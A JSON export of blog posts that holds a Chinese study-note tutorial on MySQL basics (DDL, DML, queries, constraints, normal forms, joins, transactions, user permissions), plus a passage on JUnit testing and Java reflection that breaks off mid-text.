[{"id":"bd2363725236602d9ed430e1445ce7eb","title":"JavaWeb-数据库","content":"JavaWeb - 数据库\n# 1、数据库的相关概念\n\n数据库\n数据库管理系统\nSQL\n常见的关系型数据库管理系统\n\n数据库：\n\n存储数据的仓库，数据是有组织进行存储\n英文：DataBase，简称 DB\n\n数据库管理系统：\n\n管理数据库的大型软件\n英文：DataBase Management System，简称 DBMS\n\nSQL：\n\n英文：Structured Query Language，简称 SQL，结构化查询语言\n操作关系型数据库的语言\n定义操作所有关系型数据库的统一标准\n每一种数据库的操作方式存在不一样的地方，称为 “方言”\n\n常见的关系型数据库管理系统：\n\nOracle：收费，且非常昂贵，金融银行使用 Oracle 的居多\nMySQL：开源的免费的中小型数据库，在互联网公司使用的非常多\nSQL Server：微软的收费数据库，在 Java 中使用的不多\nPostgreSQL：开源中小型数据库\nDB2：IBM 公司的大型收费数据库产品\nSQLite：嵌入式的微型数据库，如：作为 Android 内置数据库\nMariaDB：开源免费中小型数据库\n\n\n\n\n\n\n\n\n\n\n本次只学习 MySQL，对于后续的其他数据库，都是使用 SQL 操作的，而且 SQL 可以操作市面上所有的关系型数据库\n# 2、MySQL 数据库\n\nMySQL 安装\nMySQL 卸载\nMySQL 配置\nMySQL 登录、退出\n\n安装、登录、卸载、配置等参见安装手册\n\nMySQL 数据模型\n\nMySQL 数据库模型：\n\n关系型数据库\n\n关系型数据库是建立在关系模型基础上的数据库，简单说，关系型数据库是由多张能够相互连接的二维表组成的数据库\n优点：\n\n都是使用表结构，格式一致，易于维护\n使用通用的 SQL 语言操作，使用方便，可用于复杂查询\n数据存储在磁盘中，安全（存在硬盘中就是持久化存储）\n\n\n\n\n不通过表存取的就是非关系型数据库\n数据库是通过文件夹实现的，MySQL 的数据存放在 data 目录下，每个文件夹对应一个数据库\n\n# 3、SQL 通用语法\n\nSQL 语句可以以单行或多行书写，以分号结尾\n可以使用空格或制表符来提高可读性\nMySQL 数据库的 SQL 语句不区分大小写，但是关键字建议以大写来表示\n3 种注释：\n\n单行注释：– 注释内容  或 #注释内容\n多行注释：/* 注释内容 */\n\n\n\n# 4、SQL 分类\nSQL 语句根据其功能，主要分为四类：DDL、DML、DQL、DCL。 DDL：\nDDL：Data Definition Language 数据定义语言，用来定义数据库对象 (数据库，表， 字段)\nDML：Data Manipulation Language 数据操作语言，用来对数据库表中的数据进行增删改\nDQL： Data Query Language 数据查询语言，用来查询数据库中表的记录\nDCL： Data Control Language 数据控制语言，用来创建数据库用户、控制数据库的访问权限\n\n# 5、DDL：操作数据库、表\n# 5.1 操作数据库：CRUD\n\n\nC (Create)：创建\n\n\n创建数据库：create database 数据库名称；\n\n\n创建数据库，判断是否存在，不存在再创建：create database if not exists 数据库名称；\n\n\n创建数据库，并指定字符集：create database 数据库名称 character set 字符集名；\n\n\n创建一个 db4 的数据库，判断是否存在，并指定字符集为 gbk：create database if not exists db4 character set gbk;\n\n\n\n\nR (Retrieve)：查询\n\n查询所有数据库的名称：show databases;\n查询创建数据库的 SQL 语句、字符集：show create database 数据库名；\n\n\n\nU (Update)：修改\n\n修改数据库的字符集：alter database 数据库名称 character set 字符集名；\n\n\n\nD (Delete)：删除\n\n删除数据库：drop database 数据库名称；\n判断数据库是否存在，存在再删除：drop database if exists 数据库名称；\n\n\n\n使用数据库\n\n查询当前正在使用的数据库名称：select database();\n使用数据库：use 数据库名称；\n\n\n\n# 5.2 操作表：CRUD\n\n\nC (Create)：创建\n\n\n语法：create table 表名 (\n列明 1 数据类型 1,\n列名 2 数据类型 2,\n…\n列明 n 数据类型 n\n);# 注意最后一列不需要加逗号\n\n\n数据类型\n\nint：整数类型\n\nage int,\n\n\ndouble：小数类型\n\nscore double (5,2)_最多有 5 位，小数点后 2 位\n\n\ndate：日期，只包含年月日，yyyy-MM-dd\ndatetime：日期，包含年月日时分秒，yyyy-MM-dd HH:mm:ss\ntimestamp：时间戳类型，包含年月日时分秒，如果将来不给这个字段赋值或赋值为 null，则默认使用当前的系统时间来自动赋值\nvarchar：字符串\n\nname varchar (20)：姓名最大 20 个字符\n\n\n\n\n\n复制一张表，如复制一张 student 为 student1：create table student1 like student;\n\n\n创建一张学生表\n\n\nmysql> create table student(\n    -> id int,\n    -> name varchar(32),\n    -> age int,\n    -> score double(4,1),\n    -> birthday date,\n    -> insert_time timestamp\n    -> );\n\n\nR (Retrieve)：查询\n\n查询某个数据库中所有表的名称：show tables;\n查询表结构：desc 表名称；\n查询表的创建语句：show create table 表名；\n\n\n\nU (Update)：修改\n\n修改表名：alter table 表名 rename to 新表名；\n修改表的字符集：show create table 表名；alter table 表名 character set 新字符集名；\n添加一列：alter table 表名 add 列名 数据类型；\n修改列名称、类型：alter table 表名 change 旧列名 新列明 新数据类型； 或 alter table 表名 modify 列名 新数据类型；\n删除列：alter table 表名 drop 列名；\n\n\n\nD (Delete)：删除\n\n删除表：drop table 表名；\n如果存在，再删除：drop table if exists 表名；\n\n\n\n\n# 6、DML：增删改表中数据\n# 5.1 添加数据\n\n基本语法：insert into 表名 (列名 1, 列明 2,…, 列明 n) values (值 1, 值 2, 值 3,…, 值 n)\n注意：\n\n列明和值要一一对应\n如果表名后不定义列明，则默认给所有列添加值\n除了数字类型，其他类型需要使用引号 (单双引号都可以) 引起来\n\n\n\n# 5.2 删除数据\n\n基本语法：delete from 表名 [where 条件];\n\n删除 id 为 2 的值：delete from stu where id = 2;\n\n\n注意：\n\n如果不加条件，则删除表中所有记录，非常危险不要使用\n如果要删除所有记录，两种方法：\n\ndelete from 表名；-- 不推荐使用，因为有多少条记录就执行多少次指令，效率很低\n**truncate table 表名；** 先删除表，再创建一个和原表一样的空表，推荐使用，效率更高\n\n\n\n\n\n# 5.3 修改数据\n\n基本语法：update 表名 set 列名 1 = 值 1, 列明 2 = 值 2,…, 列明 n = 值 n [where 条件];\n\n将 stu 表内的 id 为 3 的 age 改为 117： UPDATE stu SET age = 117 WHERE id = 3;\n更改多条数据： UPDATE stu SET age = 18, score = 100 WHERE id = 2;\n\n\n注意：\n\n如果不加任何条件，则会将表中所有记录全部修改\n\n\n\n# 7、DQL：查询表中的记录\n\nselect * from 表名；\n\n# 7.1 语法\n\n\n\n\n\n\n\n\n\nselect\n​\t字段列表\nfrom\n​\t表名列表\nwhere\n​\t条件列表\ngroup by\n​\t分组字段\nhaving\n​\t分组之后的条件\norder by\n​\t排序\nlimit\n​\t分页限定\n# 7.2 基础查询\n\n查询多个字段：select 字段名 1, 字段名 2,… 字段名 n from 表名；\n\n注意：如果查询所有字段，则可以使用 * 来替代字段列表\n\n\n\n-- 查询姓名 和 年龄\nSELECT NAME,age FROM student;\nSELECT * FROM student;\n\n去除重复：select distinct 列名 1, 列明 2,… from 表名；\n\n-- 去除重复的结果集\nSELECT DISTINCT address FROM student;\nSELECT DISTINCT NAME,address FROM student;\n#当查询多个字段时，只有两个字段组合的值相同了之后才会去重\n\n计算列：一般可以使用四则运算来计算列的值，一般只会进行数值型的运算\n\nifnull (表达式 1, 表达式 2)：null 参与的运算，计算结果都是 null\n\n表达式 1：哪个字段需要判断是否为 Null\n表达式 2：该字段为 null 则替换后的值\n\n\n\n\n\n-- 计算math 和 English 分数之和\nSELECT NAME,math,english FROM student;\nSELECT NAME,math,english,math+english FROM student;\n-- 如果有null参与的运算,计算结果都为null\nSELECT NAME,math,english,math+IFNULL(english,0) FROM student;\n-- ifnull(a,b)：如果a为null，替换为b\n\n起别名：列名 as 重命名  或  列明 + 空格 + 重命名\n\nas 可以省略，用一个或多个空格代替\n\n\n\n-- 起别名\nSELECT NAME,math,english,math+IFNULL(english,0) AS '总分' FROM student;\nSELECT NAME,math 数学,english 英语,math+IFNULL(english,0) '总分' FROM student;\n# 7.3 条件查询\n\nwhere 子句后跟条件\n运算符\n\n&gt;、&lt;、&lt;=、&gt;=、=、&lt;&gt;\nBETWEEN…AND\nIN (集合)\nLIKE ‘张 %’ ：模糊查询\n\n_：单个任意字符\n%：多个任意字符\n\n\nIS NULL\nand 或 &amp;&amp;\nor 或 ||\nnot 或！\n\n\n\n-- 查询年龄大于20岁\nSELECT * FROM student WHERE age >= 20;\n-- 查询年龄等于20岁\nSELECT * FROM student WHERE age = 20;\n-- 查询年龄不等于20岁\nSELECT * FROM student WHERE age != 20;\nSELECT * FROM student WHERE age &lt;> 20;\n\n-- 查询年龄大于等于20，小于等于30\nSELECT * FROM student WHERE age >= 20 AND age &lt;= 30;\nSELECT * FROM student WHERE age BETWEEN 20 AND 30;\n-- 查询年龄22岁，19岁，25岁的信息\nSELECT * FROM student WHERE age = 22 OR age = 19 OR age = 25;\nSELECT * FROM student WHERE age IN (22,19,25);\n\n-- 查询英语成绩为null （null值不能使用=判断，只能用is null）\nSELECT * FROM student WHERE english IS NULL;\n-- 查询英语成绩不为null\nSELECT * FROM student WHERE english IS NOT NULL;\n\n-- 查询姓马的有哪些\nSELECT * FROM student WHERE NAME LIKE \"马%\";\n-- 查询第二个字是化的人\nSELECT * FROM student WHERE NAME LIKE \"_化%\";\n-- 查询姓名是三个字的人\nSELECT * FROM student WHERE NAME LIKE \"___\";\n-- 查询姓名中包含马的人\nSELECT * FROM student WHERE NAME LIKE \"%马%\";\n# 7.4 排序查询\n\n语法：order by 字句\n\norder by 排序字段 1 排序方式 1, 排序字段 2 排序方式 2 …;\n\n\n排序方式\n\nASC：升序，默认\nDESC：降序\n\n\n注意：\n\n如果有多个排序条件，则当前面的条件值一样时，才会判断第二条件\n\n\n\n-- 按照数学成绩排序\nSELECT * FROM student ORDER BY math ASC;\nSELECT * FROM student ORDER BY math DESC;\n-- 按照数学成绩排名，如果数学成绩一样，则按照英语成绩排名，都是升序\nSELECT * FROM student ORDER BY math ASC, english ASC;\n# 7.5 聚合函数\n\n将一列数据作为一个整体，进行纵向的计算。\n\ncount：计算个数\n\n一般选择非空的列：主键\ncount (*) —— 只要这一行数据有一个不为 null 就算作一个数据\n\n\nmax：计算最大值\nmin：计算最小值\nsum：计算和\navg：计算平均值\n\n\n注意：聚合函数的计算排除了 null 值\n\n解决方案：选择不包含空值的列进行计算，或使用 IFNULL 函数进行计算\n\n\n\n-- 查询学生的人数\nSELECT COUNT(NAME) FROM student;\nSELECT COUNT(IFNULL(english,0)) FROM student;\n-- 数学成绩的最大值和最小值\nSELECT MAX(math) FROM student;\nSELECT MIN(math) FROM student;\n-- 计算数学成绩的和\nSELECT SUM(math) FROM student;\n-- 计算数学成绩的平均值\nSELECT AVG(math) FROM student;\n# 7.6 分组查询\n\n基本语法：group by 分组字段\n注意：\n\n分组之后查询的字段：分组字段、聚合函数，写其他字段没有任何意义\nwhere 和 having 的区别：\n\nwhere 在分组之前进行限定，如果不满足这个条件则不参与分组。having 是在分组之后进行限定，如果不满足结果则不会被查询出来。\nwhere 后不可以跟聚合函数，having 可以进行聚合函数的判断\n\n\n\n\n\n-- 按照性别分组，分别查男女同学的平均分\nSELECT sex,AVG(math) FROM student GROUP BY sex;\n-- 按照性别分组，分别查男女同学的平均分、人数\nSELECT sex,AVG(math),COUNT(id) FROM student GROUP BY sex;\n-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组\nSELECT sex,AVG(math),COUNT(id) FROM student WHERE math > 70 GROUP BY sex;\n-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组,分组之后人数要大于两个人\nSELECT sex,AVG(math),COUNT(id) FROM student WHERE math > 70 GROUP BY sex HAVING COUNT(id)>2;\nSELECT sex,AVG(math),COUNT(id) 人数 FROM student WHERE math > 70 GROUP BY sex HAVING 人数>2;\n# 7.7 分页查询\n\n基本语法：limit 开始的索引，每页查询的条数；\n公式：* 开始的索引 = （当前页码 - 1）每页显示的条数\n分页操作是一个方言\n\n-- 每页显示3条记录 第一页\nSELECT * FROM student LIMIT 0,3;\n-- 每页显示3条记录 第二页\nSELECT * FROM student LIMIT 3,3;\n-- 每页显示3条记录 第三页\nSELECT * FROM student LIMIT 6,3;\n# 8、约束\n\n概念：对表中的数据进行限定，保证数据的正确性、有效性和完整性\n分类：\n\n主键约束：primary key\n非空约束：not null\n唯一约束：unique\n外键约束：foreign key\n\n\n\n# 8.1 非空约束\n\n\n非空约束：not null\n\n\n在创建表的时候添加非空约束\nCREATE TABLE stu (\n    id INT,\n    NAME VARCHAR(20) NOT NULL\n);\n-- 删除name列的非空约束\nALTER TABLE stu MODIFY NAME VARCHAR(40);\n\n\n创建完表后添加非空约束\nALTER TABLE stu MODIFY NAME VARCHAR(40) NOT NULL;\n\n\n\n\n# 8.2 唯一约束\n\n唯一约束：unique，某一列的值不能重复\n注意\n\n唯一约束可以有 null 值，但是只能有一条记录为 null\n\n\n\n\n在创建表的时候添加唯一约束\n\n-- 在创建表时添加唯一约束\nCREATE TABLE stu(\n\tid INT,\n\tphone_number VARCHAR(20) UNIQUE -- 手机号\n);\n\n创建完表后添加唯一约束\n\nALTER TABLE stu MODIFY phone_number VARCHAR(20) UNIQUE;\n\n删除唯一约束\n\nALTER TABLE stu DROP INDEX phone_number;\n# 8.3 主键约束\n\n主键：primary key\n注意\n\n含义：非空且唯一\n一张表中只能有一个主键，可以多个字段组成联合主键\n主键就是表中记录的唯一标识\n\n\n\n\n在创建表时添加主键\n\nCREATE TABLE stu (\n\tid INT PRIMARY KEY,\n\tNAME VARCHAR(20)\n);\n\n删除主键\n\nALTER TABLE stu DROP PRIMARY KEY;\n\n创建完表后添加主键\n\nALTER TABLE stu MODIFY id INT PRIMARY KEY;\n# 8.4 主键约束 - 自动增长\n\n概念：如果某一列是数值类型的，使用 auto_increment 可以完成值的自动增长\n注意\n\n自动增长的值只和上一条的值有关\n自动增长一般会和主键联合使用\n也可以不和主键一起用，但是用的很少\n\n\n\n\n在创建表时添加主键，并完成主键自增长\n\nCREATE TABLE stu (\n\tid INT PRIMARY KEY AUTO_INCREMENT,\n\tNAME VARCHAR(20)\n);\n\n删除自动增长\n\nALTER TABLE stu MODIFY id INT;\n-- 这样不会删除主键，但是可以删除自动增长\n\n创建表完成后添加自动增长\n\nALTER TABLE stu MODIFY id INT PRIMARY KEY AUTO_INCREMENT;\n-- primaey key可加可不加\n# 8.5 外键约束\n\n外键约束：foreign key，让表与表产生关系，从而保证数据的正确性\n\n\n在创建表时添加外键\n\n\n\n\n\n\n\n\n\n\n语法：\ncreate table 表名 (\n​\t…\n​\t外键列\n​\tconstraint 外键名称 foreign key 外键列 references 主表名称 (主表列名称);\n)\nCREATE TABLE employee(\n\tid INT PRIMARY KEY AUTO_INCREMENT,\n\tNAME VARCHAR(20),\n\tage INT,\n\tdep_id INT, -- 外键对应主表的主键\n\tCONSTRAINT emp_dept_id FOREIGN KEY (dep_id) REFERENCES department(id)\n);\n\n删除外键\n\nALTER TABLE 表名 DROP FOREIGN KEY 外键名称;\nALTER TABLE employee DROP FOREIGN KEY emp_dept_id;\n\n在创建表之后添加外键\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明);\nALTER TABLE employee ADD CONSTRAINT emp_dep_id FOREIGN KEY (dep_id) REFERENCES department(id);\n# 8.6 外键约束 - 级联操作\n\n添加外键，设置级联更新\n\n概念：父表的主键在更新时，子表的外键值也跟着更新\n\n\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明) ON UPDATE CASCADE;\n\n添加外键，设置级联删除\n\n概念：父表的主键在删除时，会自动删除子表外键中有该父表主键值的那一行数据\n\n\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明) ON DELETE CASCADE;\n\n级联更新和删除可以在一行内一起使用，如\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明) ON UPDATE CASCADE ON DELETE CASCADE;\n\n实际开发情况中级联的使用是非常谨慎的\n\n# 9、数据库的设计\n\n多表之间的关系\n数据库设计的范式\n\n# 9.1 多表之间的关系\n\n一对一（了解）：\n\n如：人和身份证\n分析：一个人只有一个身份证，一个身份证也只能对应一个人\n\n\n一对多（多对一）：\n\n如：部门和员工\n分析：一个部门有多个员工，一个员工只能对应一个部门\n\n\n多对多：\n\n如：学生和课程\n分析：一个学生可以选择很多课程，一个课程也可以被很多学生选择\n\n\n\n# 9.2 一对多表关系实现\n\n如：部门和员工\n\n\n\n实现方式：在多的地方去建立外键指向 1 的一方的主键\n在员工表里添加一个外键指向部门表的主键\n\n# 9.3 多对多表关系实现\n\n如：学生和课程\n\n\n\n实现方式：借助第三章中间表，中间表至少包含两个字段，分别指向两个表的主键\n两个字段要使用联合主键 ——foreign key (sid,cid);\n\n# 9.4 一对一表关系实现\n\n如：人和身份证\n\n\n\n实现方式：在任何一方添加唯一外键指向另一方的主键\n实际情况中一般会把两张表合成一张表\n\n# 10、范式\n\n概念：在设计数据库时需要遵循的规范。要遵循后边的范式要求，必须先遵循前边的所有范式要求\n分类：\n\n第一范式（1NF）：每一列都是不可分割的原子数据项\n第二范式（2NF）：在第一范式的基础上，非码属性必须完全依赖于候选码（在 1NF 基础上消除非主属性对主码的部分函数依赖 ）\n\n几个概念\n\n函数依赖：A-----&gt;B，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，则称 B 依赖于 A\n完全函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定需要 A 中所有的属性值\n部分函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定只需要依赖于 A 属性组中某一些值即可\n传递函数依赖：A-----&gt;B，B-----&gt;C，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，再通过 B 属性（属性组）的值可以确定唯一 C 属性的值，则称 C 传递函数依赖于 A\n码：如果在一张表中，一个属性或属性组被其他所有属性所完全依赖，则称这个属性（属性组）为该表的码\n主属性：码属性组中的所有属性\n非主属性：除去码属性组的属性\n\n\n\n\n第三范式（3NF）：在 2NF 的基础上，任何非主属性不依赖于其他非主属性（在 2NF 基础上消除传递依赖）\n\n\n\n# 11、数据库的备份和还原\n# 11.1 命令行\n备份：\nmysqldump -u用户名 -p密码 数据库名 > 保存的路径\n还原：\n1. 登录数据库\n2. 创建数据库\n3. 使用数据库\n4. 执行文件，source 文件路径\n# 11.2 图形化工具\n\n根据使用的工具进行导出和导入\n\n# 12、多表查询\n\n笛卡尔积：由两个集合 A,B，取这两个集合的所有组成情况\n要完成多表查询，需要消除无用的数据\n多表查询分类\n\n内连接查询\n外连接查询\n子查询\n\n\n\n# 12.1 多表查询 - 内连接\n\n内连接查询两张表中同时存在的数据，如果某一表的条件语句的字段为空，则这个结果不在结果表中显示\n\n\n隐式内连接：使用 where 条件来消除无用的数据\n\n-- 查询所有员工信息和对应部门信息,一般查询的时候会查询部分字段，不会将所有字段都查出来\nSELECT * FROM emp,dept WHERE emp.dept_id = dept.id;\n-- 查询员工表的名称，性别，部门表的名称\nSELECT emp.name,emp.gende,dept.name FROM emp,dept WHERE emp.dept_id = dept.id;\n-- 查询员工表的名称，性别，部门表的名称，使用表的别名\nSELECT t1.name,t1.gende,t2.`name` FROM emp t1,dept t2 where t1.dept_id = t2.id;\n\n显式内连接：\n\n语法：select 字段列表 from 表名 1 inner join 表名 2 on 条件；\n\n\n\nSELECT * FROM emp INNER JOIN dept ON emp.dept_id = dept.id;\nSELECT * FROM emp JOIN dept ON emp.dept_id = dept.id;\n\n\n内连接查询注意事项：\n\n从哪些表中查询数据\n查询条件是什么\n查询哪些字段\n\n\n\n# 12.2 多表查询 - 外连接\n\n左外连接\n\n语法：select 字段列表 from 表 1 left [outer] join 表 2 on 条件；\n查询的是左表的所有数据以及两表的交集部分\n\n\n\nSELECT t1.*,t2.`name` FROM emp t1 LEFT JOIN dept t2 ON t1.dept_id = t2.id;\n\n\n右外连接\n\n语法：select 字段列表 from 表 1 right [outer] join 表 2 on 条件；\n查询的是右表的所有数据以及两表的交集部分\n\n\n\nSELECT t1.*,t2.`name` FROM emp t1 RIGHT JOIN dept t2 ON t1.dept_id = t2.id;\n\n# 12.3 多表查询 - 子查询\n\n概念：查询中嵌套查询，称嵌套的查询为子查询\n基本演示\n\n-- 查询工资最高的员工信息\n-- 1.查询最高的工资是多少 9000\nSELECT MAX(salary) FROM emp;\n-- 2.查询员工信息，并且工资等于9000的\nSELECT * FROM emp WHERE salary = 9000;\n-- 一条SQL完成查询，子查询\nSELECT * FROM emp WHERE emp.salary = (SELECT MAX(salary) FROM emp);\n\n\n子查询的不同情况\n\n子查询的结果是单行单列的\n\n子查询可以作为条件，使用运算符去判断。运算符：&gt; &lt; &gt;= &lt;= &lt;&gt; =\n查询工资小于平均工资的人\nSELECT * FROM emp WHERE salary &lt; (SELECT AVG(salary) FROM emp);\n\n\n子查询的结果是多行单列的\n\n子查询可以作为条件，使用运算符 IN 来判断\n\n\n\n-- 查询`财务部`和`市场部`所有员工的信息\nSELECT id FROM dept WHERE `NAME` = \"财务部\" OR `NAME` = \"市场部\";\nSELECT * FROM emp WHERE dept_id = 3 OR dept_id = 2;\nSELECT * FROM emp WHERE dept_id IN (2,3);\n\nSELECT * FROM emp WHERE dept_id IN (SELECT id FROM dept WHERE `NAME` = \"财务部\" OR `NAME` = \"市场部\");\n\n子查询的结果是多行多列的\n\n子查询可以作为一张虚拟表来进行表的查询\n\n\n\nSELECT * FROM dept t1, (SELECT * FROM emp WHERE emp.join_date > '2011-11-11') t2 WHERE t1.id = t2.dept_id;\n-- 使用普通内连接查询\nSELECT * FROM emp t1, dept t2 WHERE t1.dept_id = t2.id AND t1.join_date > '2011-11-11';\n\n\n\n# 13、事务\n\n事务的基本介绍\n事务的四大特征 **（常见面试题）**\n事务的隔离级别（了解）\n\n# 13.1 事务的基本介绍\n\n概念：如果一个包含多个步骤的业务操作，被事务管理，那么这些操作要么同时成功，要么同时失败\n\n\n\n\n操作：\n\n开启事务：start transaction\n回滚：rollback\n提交：commit\n\n\n\nMySQL 数据库中事务默认自动提交，Oracle 数据库默认是手动提交事务\n\n事务提交的两种方式：\n\n自动提交：\n\nmysql 就是自动提交的\n一条 DML（增删改）语句会自动提交一次事务\n\n\n手动提交：\n\n需要先开启事务，再提交\n\n\n\n\n修改事务的默认提交方式\n\n\n\n-- 查看事务的默认提交方式\nselect @@autocommmit; #结果为1表示自动提交，结果为0表示手动提交\n-- 修改默认提交方式\nset @@autocommit = 0;\n#这时候写了DML语句，不手动提交是不会生效的\n# 13.2 事务的四大特征 ***\n\n原子性：是不可分割的最小操作单位，要么同时成功，要么同时失败\n持久型：当事务提交或回滚后，数据库会持久化地保存数据\n隔离性：多个事务之间相互独立\n一致性：事务操作前后数据总量不变\n\n# 13.3 事务的隔离级别\n\n\n概念：多个事务之间是隔离的，相互独立的，但是如果多个事务操作同一批数据，则会引发问题，设置不同的隔离级别就可以解决这些问题。\n\n\n存在的问题：\n\n脏读：一个事务，读取到另一个事务中没有提交的数据\n不可重复度（虚读）：在同一个事务中两次读取到的数据不一样\n幻读：一个事务操作（DML）数据表中所有的记录，另一个事务添加了一条数据，则第一个事务查询不到自己的修改\n\n\n\n隔离级别：\n\nread uncommitted：读未提交\n\n会产生的问题：脏读、不可重复度、幻读\n\n\nread committed：读已提交（Oracle 默认隔离级别）\n\n会产生的问题：不可重复度、幻读\n\n\nrepeatable read：可重复度（MySQL 中默认隔离级别）\n\n会产生的问题：幻读\n\n\nserializable：串行化\n\n可以解决所有的问题\n\n\n\n\n\n注意：隔离级别从小到大，安全性越来越高，但是效率越来越低\n\n\n数据隔离级别查询和设置\n\n\n-- 查询隔离级别：\nselect @@tx_isolation;\n-- 设置隔离级别：\nset global transaction isolation level 级别字符串; #字符串就是上面的4个\n# 14、DCL：管理用户，授权\n\nDBA：数据库管理员\n\n管理用户\n授权\n\n\n\n# 14.1 用户管理\n\n添加用户\n删除用户\n修改用户密码\n\nMySQL 中忘记 root 密码\n\n以 CMD 执行 net stop mysql 停止 mysql 服务（管理员权限）\n使用无验证方式启动 MySQL 服务：mysqld --skip-grant-tables\n打开新的 cmd 窗口，直接输入 mysql 命令回车就可以登录成功\nuse mysql;\nupdate user set password = password (‘新密码’) where user = ‘root’;\n关闭这两个窗口\n打开任务管理器，手动结束 mysqld.exe 进程\n使用新密码登录\n\n\n\n\n查询用户\n\n通配符 %：表示可以在任意主机使用用户登录数据库\n\n\n\n-- 切换到mysql数据库\nUSE mysql;\n-- 查询user表\nSELECT * FROM USER;\n\n-- 创建用户\ncreate user '用户名'@'主机名' identified by '密码';\nCREATE USER 'zhangsan'@'localhost' IDENTIFIED BY '123';\n\n-- 删除用户\nDROP USER '用户名'@'主机名';\nDROP USER 'zhangsan'@'localhost';\n\n-- 修改用户密码\nUPDATE USER SET PASSWORD = PASSWORD('新密码') WHERE user = '用户名';\nSET PASSWORD FOR '用户名'@'主机名' = PASSWORD('新密码');\n# 14.2 权限管理\n\n查询权限\n授予权限\n撤销权限\n\n-- 查询权限\nSHOW GRANTS FOR '用户名'@'主机名';\nSHOW GRANTS FOR 'zhangsan'@'localhost';\n\n-- 授予权限\nGRANT 权限列表 ON 数据库名.表名 TO '用户名'@'主机名';\nGRANT SELECT ON db3.dept TO 'zhangsan'@'localhost';\nGRANT ALL ON *.* TO 'zhangsan'@'localhost';#将所有表的所有权限授予zhangsan\n\n-- 撤销权限\nREVOKE 权限列表 ON 数据库名.表名 FROM '用户名'@'主机名';\nREVOKE UPDATE ON DB3.ACCOUNT FROM 'LISI'@'%';\n","slug":"JavaWeb-数据库","date":"2022-06-20T15:09:13.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"7ee1f34768cc2e04e0232a752344cda0","title":"junit、反射","content":"# 1、junit 单元测试\n# 1.1 测试分类：\n\n黑盒测试：不用具体关注里面的代码内容，只要输入 input，经过代码的执行查看 output 是否达到预期，不需要写测试代码\n白盒测试：也需要 input 和 output，但是输入了之后代码的执行，代码的逻辑、算法、严谨度、效率等都要关注，需要写测试代码\n\njunit 就是白盒测试的一种\n# 1.2 junit 的使用\n\n\n步骤\n\n定义一个测试类（测试用例）\n\n建议：\n\n测试类名：被测试类名 Test，如 CalculatorTest\n包名：xxx.xxx.xx.test，如 cn.itclass.test\n\n\n\n\n定义测试方法：可以独立运行\n\n建议：\n\n方法名：test 测试方法名，如 testAdd ()\n返回值：void\n参数列表：空参\n\n\n\n\n给这个方法加 @Test\n导入 Junit 依赖环境（点击红灯泡，添加 junit 到 classpath）—— 视频课包为 org.junit.Test，自己补全的为 org.testng.annotations.Test; ，但是能用\n\n运行成功后会显示绿色 Test passed\n使用 junit 的时候看的不是输出的结果，看的是红色还是绿色，红色表示失败，绿色表示成功\n\n\n\n\n\n判定结果\n\n红色：失败\n绿色：成功\n可以使用 Assert 对结果进行判定，如果判定结果成功就是绿色，结果与断言结果不一样是红色\n\nAssert：静态类，使用 Assert.assertEquals (期望值，真实值)\n判定结果的时候一般不进行输出\n\n\n\n\n\n可以在一个 junit 类里面定义多个方法，然后点击对应方法的绿色小箭头单独运行\n\n\npackage cn.itclass.test;\n\nimport cn.itclass.junit.caculater;\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.testng.Assert;\n\n\n\npublic class CalculatorTest &#123;\n    @Before\n    public void init() &#123;\n            System.out.println(\"before\");\n    &#125;\n    /**\n     * 测试add方法\n     */\n    @Test\n    public void testAdd()&#123;\n        System.out.println(\"我被执行了\");\n        //1.创建计算器对象\n        caculater a = new caculater();\n        int sum = a.add(1, 2);\n        //2.调用add方法\n        System.out.println(sum);\n        //3.断言：我断言的结果是3，如果是一样的就是\n        Assert.assertEquals(3,sum);\n    &#125;\n\n    @After\n    public void finish() &#123;\n        System.out.println(\"结束了\");\n    &#125;\n&#125;\n\n补充\n\n@Before：\n\n修饰的方法会在测试方法之前被自动执行\n\n\n@After：\n\n修饰的方法会在测试方法执行之后被自动执行\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n注：导包的时候一定要使用 org.junit ，如果导入的是 org.testng.annotations.Test，Test 可以正常使用，Before 和 After 不能\n# 2、反射：框架设计的灵魂\n\n\n框架：半成品软件。可以在框架的基础上进行软件的开发，简化编码\n\n\n反射：将类的各个组成部分封装为其他对象，这个过程称为反射机制\n\n\njava 代码在计算机中运行的三个阶段：\n\n\nSource 源代码阶段：写完一个类之后，使用 javac 进行编译，编译后成为一个 class 字节码文件，里面分三个区域，一个存档成员变量，一个存放构造方法，一个存放成员方法\n\n\nClass 类对象阶段：类加载器 ClassLoader 将字节码文件加载到内存中，内存中会有一个 Class 类对象来描述字节码文件，这个对象中有成员变量、构造方法、成员方法，成员变量封装成 Field 对象，构造方法封装为 Constructor 对象，成员方法封装为 Method 对象，这三个对象在 Class 类对象里面组成 Class 类，由于变量可能有多个，于是使用一个数组来描述成员内容如下\n\nField [] fields\nConstructor[] cons\nMethod[] methods\n\n这些组成一个类对象，之后可以使用这些类对象进行实例化等\n\n\nRuntime 运行阶段：Person 对象 new Person ();\n\n\n\n\n好处：\n\n可以在程序运行过程中去操作这些对象。\n可以解耦，提高程序的可扩展性\n\n\n\n\n# 2.1 获取 Class 类对象的方式\n\nClass.forName (“全类名”)：是将字节码文件加载进内存，返回 Class 对象\n\n多用于配置文件，将类名可以定义在配置文件中。读取文件，加载类\n\n\n类名.class：通过类名的属性 class 来获取\n\n多用于参数的传递\n\n\n对象.getClass ()：getClass () 方法在 Object 类中定义着\n\n多用于对象的获取字节码的方式，有对象了想获取字节码文件对象\n\n\n\n\n结论：同一个字节码文件 (*.class) 在一次程序的运行过程中，只会被加载一次，不论通过哪一种方式获取的 Class 对象都是同一个\n\npackage 